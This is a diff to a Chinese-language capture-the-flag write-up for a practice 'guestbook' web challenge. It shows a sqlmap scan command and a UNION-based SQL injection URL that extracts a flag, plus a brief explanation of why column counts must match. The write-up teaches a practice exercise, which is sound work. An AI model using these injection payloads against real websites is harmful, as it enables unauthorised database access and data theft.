@@ -1,6 +1,6 @@
 # inndy web guestbook
 * [題目網址](https://hackme.inndy.tw/gb)
-1. 用 sqlmap 掃每個網址，最後發現 sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" 時出現有 UNION BASE SQL INJECTION，且欄位數目 4 個
+1. 題目提示用 sqlmap，所以用 sqlmap 掃每個網址，最後發現 sqlmap -u "https://hackme.inndy.tw/gb/?mod=read&id=10" 時出現有 UNION BASE SQL INJECTION，且欄位數目 4 個
 2. 開始利用此漏洞得到 database name, table name, column name...
 ```
 # 得到 database name 為 g8:
@@ -17,5 +17,5 @@ https://hackme.inndy.tw/gb/?mod=read&id=10 UNION SELECT 1, 2, 3, flag FROM flag 
 ```
 
 * UNION BASE SQL INJECTION 原理:
-UNION 在 SQL 語法中是用來合併查詢用的，把 UNION 後面的查詢結果接在前面查詢結果的後面，所以 COLUMN 數量也必須一樣，超過會出錯。
+UNION 在 SQL 語法中是用來合併查詢用的，把 UNION 後面的查詢結果接在前面查詢結果的後面，所以 COLUMN 數量也必須一樣，多了少了都會出錯。
 * [sqlmap 教學](http://www.vuln.cn/1992)
